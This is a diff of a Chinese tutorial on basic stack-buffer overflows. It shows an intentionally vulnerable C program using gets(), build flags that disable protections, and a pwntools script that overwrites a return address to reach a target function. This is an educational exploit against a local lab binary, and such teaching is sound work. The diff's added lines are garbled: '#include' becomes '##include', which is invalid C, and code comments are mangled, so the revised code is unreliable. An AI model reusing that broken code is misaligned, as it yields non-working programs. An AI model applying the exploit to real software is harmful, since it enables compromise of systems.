@@ -1,19 +1,19 @@
 # 栈溢出原理
 
-# 介绍
+## 介绍
 
 栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致栈中与其相邻的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞(比如说，还有向堆中写，向bss段写)。而对于黑客来说，栈溢出漏洞轻则可以使得程序崩溃，重则可以使得攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是
 
 - 程序必须向栈上写入数据。
 - 写入的数据大小没有被良好地控制。
 
-# 基本示例
+## 基本示例
 
 最典型的栈溢出利用是覆盖程序的返回地址为攻击者所控制的地址，**当然需要确保这个地址的代码可以执行**。下面，我们举一个简单的例子：
 
 ```C
-#include <stdio.h>
-#include <string.h>
+##include <stdio.h>
+##include <string.h>
 void success() { puts("You Hava already controlled it."); }
 void vulnerable() {
   char s[12];
@@ -45,7 +45,7 @@ stack_example.c:(.text+0x27): 警告： the `gets' function is dangerous and sho
 
 > 历史上，**莫里斯蠕虫**第一种蠕虫病毒就利用了gets这个危险函数实现了栈溢出。
 
-此外，-m32指的是生成32位程序，`-fno-stack-protector` 指的是不开启堆栈保护，即不生成canary，这是为了更加方便地介绍栈溢出的基本利用方式；而且该程序并没有开启ASLR保护。之后，我们利用IDA来反编译一下二进制程序并查看vulnerable函数 。可以看到
+此外，`-m32` 指的是生成32位程序； `-fno-stack-protector` 指的是不开启堆栈溢出保护，即不生成canary。此外，该程序并没有开启ASLR保护。这是为了更加方便地介绍栈溢出的基本利用方式。之后，我们利用IDA来反编译一下二进制程序并查看vulnerable函数 。可以看到
 
 ```C
 int vulnerable()
@@ -97,7 +97,7 @@ int vulnerable()
 0x14*'a'+'bbbb'+success_addr
 ```
 
-那么，由于gets会读到回车才算结束，所以我们可以直接读取所有的字符串，并且将saved ebp覆盖为bbbb，将retaddr覆盖为success_addr,即，此时的栈结构为
+那么，由于gets会读到回车才算结束，所以我们可以直接读取所有的字符串，并且将saved ebp覆盖为bbbb，将retaddr覆盖为success_addr，即，此时的栈结构为
 
 ```text
                                            +-----------------+
@@ -123,17 +123,17 @@ int vulnerable()
 但是，我们又不能直接在终端将这些字符给输入进去，在终端输入的时候\，x等也算一个单独的字符。。所以我们需要想办法将\x3b之类的作为一个字符输入进去。那么此时我们就需要使用一波pwntools了(关于如何安装以及基本用法，请自行github)，这里利用pwntools的代码如下：
 
 ```python
-#coding=utf8
+##coding=utf8
 from pwn import *
-# 构造与程序交互的对象
+## 构造与程序交互的对象
 sh = process('./stack_example')
 success_addr = 0x0804843b
-# 构造payload
+## 构造payload
 payload = 'a' * 0x14 + 'bbbb' + p32(success_addr)
 print p32(success_addr)
-# 向程序发送字符串
+## 向程序发送字符串
 sh.sendline(payload)
-# 将代码交互转换为手工交互
+## 将代码交互转换为手工交互
 sh.interactive()
 ```
 
@@ -154,11 +154,11 @@ $
 
 可以看到我们确实已经执行success函数。
 
-# 小总结
+## 小总结
 
 上面的示例其实也展示了栈溢出中比较重要的几个步骤:
 
-## 寻找危险函数
+### 寻找危险函数
 
 通过寻找危险函数，我们快速确定程序是否可能有栈溢出，以及有的话，栈溢出的位置在哪里。
 
@@ -175,7 +175,7 @@ $
   - strcat，字符串拼接，遇到'\x00'停止
   - bcopy
 
-## 确定填充长度
+### 确定填充长度
 
 这一部分主要是计算**我们所要操作的地址与我们所要覆盖的地址的距离**。常见的操作方法就是打开IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式
 
